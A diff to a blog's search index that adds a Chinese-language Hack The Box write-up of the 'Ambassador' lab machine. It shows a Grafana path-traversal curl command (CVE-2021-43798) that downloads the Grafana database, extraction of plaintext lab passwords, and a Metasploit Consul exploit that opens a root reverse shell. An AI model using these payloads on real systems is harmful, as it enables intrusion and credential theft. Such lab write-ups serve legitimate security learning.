@@ -229,6 +229,78 @@ chainedTransformer<span class="token punctuation">.</span><span class="token fun
       </tags>
   </entry>
   <entry>
+    <title>HTB-Ambassador</title>
+    <url>/2022/10/14/htb-ambassador/</url>
+    <content><![CDATA[<h1 id="HTB-Ambassador"><a href="#HTB-Ambassador" class="headerlink" title="HTB-Ambassador"></a>HTB-Ambassador</h1><p>查看端口</p>
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_08.39.03.png" alt="截屏2022-10-14 08.39.03.png"></p>
+<p>修改hosts，80端口</p>
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_08.41.02.png" alt="截屏2022-10-14 08.41.02.png"></p>
+<p>3000端口是Grafana，可以想到有一个任意文件读取（CVE-2021-43798）,初步检查存在该漏洞</p>
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_08.50.32.png" alt="截屏2022-10-14 08.50.32.png"></p>
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_08.56.49.png" alt="截屏2022-10-14 08.56.49.png"></p>
+<p>读一下grafana的配置文件，默认位置/etc/grafana/grafana.ini</p>
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_09.04.09.png" alt="截屏2022-10-14 09.04.09.png"></p>
+<p>查一下默认密码</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json">admin_password = messageInABottle685427<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_09.05.33.png" alt="截屏2022-10-14 09.05.33.png"></p>
+<p>成功登录：</p>
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_09.07.07.png" alt="截屏2022-10-14 09.07.07.png"></p>
+<p>我们利用curl下载grafana的db文件：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">curl <span class="token operator">-</span><span class="token operator">-</span>path<span class="token operator">-</span><span class="token keyword">as</span><span class="token operator">-</span><span class="token keyword">is</span> http<span class="token punctuation">:</span><span class="token operator">//</span>ambassador<span class="token punctuation">.</span>htb<span class="token punctuation">:</span><span class="token number">3000</span><span class="token operator">/</span>public<span class="token operator">/</span>plugins<span class="token operator">/</span>alertlist<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>var<span class="token operator">/</span>lib<span class="token operator">/</span>grafana<span class="token operator">/</span>grafana<span class="token punctuation">.</span>db <span class="token operator">-</span>o grafana<span class="token punctuation">.</span>db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_09.34.24.png" alt="截屏2022-10-14 09.34.24.png"></p>
+<p>利用sqlite3读取数据库并查看data_source：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">sqlite3 grafana<span class="token punctuation">.</span>db
+<span class="token punctuation">.</span>tables
+select <span class="token operator">*</span> <span class="token keyword">from</span> data_source<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">2</span><span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span>mysql<span class="token operator">|</span>mysql<span class="token punctuation">.</span>yaml<span class="token operator">|</span>proxy<span class="token operator">|</span><span class="token operator">|</span>dontStandSoCloseToMe63221!<span class="token operator">|</span>grafana<span class="token operator">|</span>grafana<span class="token operator">|</span><span class="token number">0</span><span class="token operator">|</span><span class="token operator">|</span><span class="token operator">|</span><span class="token number">0</span><span class="token operator">|</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token operator">|</span><span class="token number">2022</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">22</span><span class="token punctuation">:</span><span class="token number">43</span><span class="token punctuation">:</span><span class="token number">03</span><span class="token operator">|</span><span class="token number">2022</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">13</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">09</span><span class="token punctuation">:</span><span class="token number">54</span><span class="token operator">|</span><span class="token number">0</span><span class="token operator">|</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span>uKewFgM4z<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>实际情况可能是通过AES-256进行加密，我们可以使用这个<a href="https://github.com/jas502n/Grafana-CVE-2021-43798">工具</a>进行解密，我们获取到了mysql密码dontStandSoCloseToMe63221! 并通过grafana账号可以登录</p>
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_09.41.07.png" alt="截屏2022-10-14 09.41.07.png"></p>
+<p>成功发现developer的加密密码，base64解密</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_09.43.11.png" alt="截屏2022-10-14 09.43.11.png"></p>
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_09.56.10.png" alt="截屏2022-10-14 09.56.10.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">anEnglishManInNewYork027468<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>登录developer账号获取flag：</p>
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_09.57.51.png" alt="截屏2022-10-14 09.57.51.png"></p>
+<p>我们在opt文件夹下发现了一个my-app文件夹，通过主页的信息可以猜测这个文件夹是开发者提交的地方</p>
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_10.11.09.png" alt="截屏2022-10-14 10.11.09.png"></p>
+<p>那么我们用git log查看一下是否有提交日志</p>
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_10.12.18.png" alt="截屏2022-10-14 10.12.18.png"></p>
+<p>成功发现了git日志，那我尝试git show 33a53ef9a207976d5ceceddc41a199558843bf3c看一下具体修改了什么代码：</p>
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_10.13.36.png" alt="截屏2022-10-14 10.13.36.png"></p>
+<h3 id="提权思路："><a href="#提权思路：" class="headerlink" title="提权思路："></a>提权思路：</h3><p>我们看到Consul，google一下发现</p>
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_10.54.48.png" alt="截屏2022-10-14 10.54.48.png"></p>
+<p>那么我们查找一下HashiCorp Consul的漏洞</p>
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_10.55.47.png" alt="截屏2022-10-14 10.55.47.png"></p>
+<p>发现存在RCE，具体测试步骤如下：</p>
+<p>首先我们需要将ssh转发到本地，这里我转发到本地的8500端口：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">ssh developer@ambassador<span class="token punctuation">.</span>htb <span class="token operator">-</span>L <span class="token number">8500</span><span class="token punctuation">:</span>localhost<span class="token punctuation">:</span><span class="token number">8500</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_10.56.58.png" alt="截屏2022-10-14 10.56.58.png"></p>
+<p>我们访问一下本地的8500端口，如果发现存在API，那么就证明存在漏洞</p>
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_10.57.39.png" alt="截屏2022-10-14 10.57.39.png"></p>
+<p>我们是用msf中的consul_service_exec模块来进行利用，设置RHOSTS为localhost，端口是转发过来的8500，ACL_TOKEN是git中获取到的：</p>
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_10.58.50.png" alt="截屏2022-10-14 10.58.50.png"></p>
+<p>发起攻击，成功反弹一个root权限的shell回来：</p>
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_11.00.13.png" alt="截屏2022-10-14 11.00.13.png"></p>
+<p>查看flag</p>
+<p><img src="/2022/10/14/htb-ambassador/%25E6%2588%25AA%25E5%25B1%258F2022-10-14_11.00.40.png" alt="截屏2022-10-14 11.00.40.png"></p>
+]]></content>
+      <categories>
+        <category>HTB</category>
+      </categories>
+      <tags>
+        <tag>博客</tag>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB-OpenSource</title>
     <url>/2022/10/07/htb-opensource/</url>
     <content><![CDATA[<h1 id="HTB-OpenSource"><a href="#HTB-OpenSource" class="headerlink" title="HTB-OpenSource"></a>HTB-OpenSource</h1><p>IP: 10.10.11.164</p>
